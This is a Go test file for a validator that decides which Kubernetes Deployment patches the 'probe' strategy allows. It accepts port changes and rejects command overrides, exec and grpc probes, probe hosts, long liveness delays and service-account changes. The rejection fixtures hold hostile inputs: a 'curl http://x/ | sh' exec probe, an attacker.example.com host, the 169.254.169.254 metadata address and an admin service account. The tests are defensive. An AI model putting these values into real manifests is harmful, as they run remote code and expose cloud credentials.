package shadow

import (
	"strings"
	"testing"
)

const probeOriginal = `apiVersion: apps/v1
kind: Deployment
spec:
  template:
    spec:
      containers:
      - name: web-app
        readinessProbe:
          httpGet:
            port: 80
`

func TestProbeStrategyAllowsProbeChange(t *testing.T) {
	revised := `spec:
  template:
    spec:
      containers:
      - name: web-app
        readinessProbe:
          httpGet:
            port: 8080
`
	if err := ValidateRevisedPatch(probeOriginal, revised, "probe"); err != nil {
		t.Fatalf("probe port change must be allowed: %v", err)
	}
}

func TestProbeStrategyStillRejectsCommand(t *testing.T) {
	revised := `spec:
  template:
    spec:
      containers:
      - name: web-app
        command: ["sh", "-c", "true"]
`
	if err := ValidateRevisedPatch(probeOriginal, revised, "probe"); err == nil {
		t.Fatal("command override must stay rejected under the probe strategy")
	}
}

func TestProbeStrategyRejectsExecProbe(t *testing.T) {
	revised := `spec:
  template:
    spec:
      containers:
      - name: web-app
        readinessProbe:
          exec:
            command: ["sh", "-c", "curl http://x/ | sh"]
`
	err := ValidateRevisedPatch(probeOriginal, revised, "probe")
	if err == nil {
		t.Fatal("exec probe must be rejected under the probe strategy")
	}
	if !strings.Contains(err.Error(), "probe handler is not allowed") {
		t.Fatalf("want a probe-handler rejection reason, got: %v", err)
	}
}

func TestProbeStrategyRejectsGRPCProbe(t *testing.T) {
	revised := `spec:
  template:
    spec:
      containers:
      - name: web-app
        readinessProbe:
          grpc:
            port: 8080
`
	err := ValidateRevisedPatch(probeOriginal, revised, "probe")
	if err == nil {
		t.Fatal("grpc probe must be rejected under the probe strategy")
	}
	if !strings.Contains(err.Error(), "probe handler is not allowed") {
		t.Fatalf("want a probe-handler rejection reason, got: %v", err)
	}
}

func TestProbeStrategyRejectsHTTPGetHost(t *testing.T) {
	revised := `spec:
  template:
    spec:
      containers:
      - name: web-app
        readinessProbe:
          httpGet:
            port: 8080
            host: attacker.example.com
`
	err := ValidateRevisedPatch(probeOriginal, revised, "probe")
	if err == nil {
		t.Fatal("httpGet.host must be rejected under the probe strategy")
	}
	if !strings.Contains(err.Error(), "host is not allowed") {
		t.Fatalf("want a host rejection reason, got: %v", err)
	}
}

func TestProbeStrategyRejectsTCPSocketHost(t *testing.T) {
	revised := `spec:
  template:
    spec:
      containers:
      - name: web-app
        readinessProbe:
          tcpSocket:
            port: 8080
            host: 169.254.169.254
`
	err := ValidateRevisedPatch(probeOriginal, revised, "probe")
	if err == nil {
		t.Fatal("tcpSocket.host must be rejected under the probe strategy")
	}
	if !strings.Contains(err.Error(), "host is not allowed") {
		t.Fatalf("want a host rejection reason, got: %v", err)
	}
}

func TestProbeStrategyAllowsTCPSocketChange(t *testing.T) {
	revised := `spec:
  template:
    spec:
      containers:
      - name: web-app
        readinessProbe:
          tcpSocket:
            port: 8080
`
	if err := ValidateRevisedPatch(probeOriginal, revised, "probe"); err != nil {
		t.Fatalf("plain tcpSocket port change must be allowed: %v", err)
	}
}

func TestProbeStrategyRejectsSlowLivenessProbe(t *testing.T) {
	revised := `spec:
  template:
    spec:
      containers:
      - name: web-app
        livenessProbe:
          httpGet:
            port: 8080
          initialDelaySeconds: 300
`
	err := ValidateRevisedPatch(probeOriginal, revised, "probe")
	if err == nil {
		t.Fatal("a livenessProbe whose first check lands past the soak window must be rejected")
	}
	if !strings.Contains(err.Error(), "shadow soak window") {
		t.Fatalf("want a soak-window rejection reason, got: %v", err)
	}
}

func TestProbeStrategyRejectsSlowStartupProbe(t *testing.T) {
	revised := `spec:
  template:
    spec:
      containers:
      - name: web-app
        startupProbe:
          tcpSocket:
            port: 8080
          initialDelaySeconds: 120
`
	err := ValidateRevisedPatch(probeOriginal, revised, "probe")
	if err == nil {
		t.Fatal("a startupProbe with a first check past the soak window must be rejected")
	}
	if !strings.Contains(err.Error(), "shadow soak window") {
		t.Fatalf("want a soak-window rejection reason, got: %v", err)
	}
}

func TestProbeStrategyAllowsSlowReadinessProbe(t *testing.T) {
	// A readiness probe cannot restart a container, so a large
	// initialDelaySeconds is not the hazard the liveness/startup ceiling guards.
	revised := `spec:
  template:
    spec:
      containers:
      - name: web-app
        readinessProbe:
          httpGet:
            port: 8080
          initialDelaySeconds: 300
`
	if err := ValidateRevisedPatch(probeOriginal, revised, "probe"); err != nil {
		t.Fatalf("slow readiness probe must be allowed: %v", err)
	}
}

func TestProbeStrategyAllowsNormalLivenessProbe(t *testing.T) {
	revised := `spec:
  template:
    spec:
      containers:
      - name: web-app
        livenessProbe:
          httpGet:
            port: 8080
          initialDelaySeconds: 10
`
	if err := ValidateRevisedPatch(probeOriginal, revised, "probe"); err != nil {
		t.Fatalf("a normal liveness probe must be allowed: %v", err)
	}
}

func TestProbeStrategyStillRejectsServiceAccount(t *testing.T) {
	revised := `spec:
  template:
    spec:
      serviceAccountName: admin
      containers:
      - name: web-app
        readinessProbe:
          httpGet:
            port: 8080
`
	if err := ValidateRevisedPatch(probeOriginal, revised, "probe"); err == nil {
		t.Fatal("serviceAccountName change must stay rejected")
	}
}
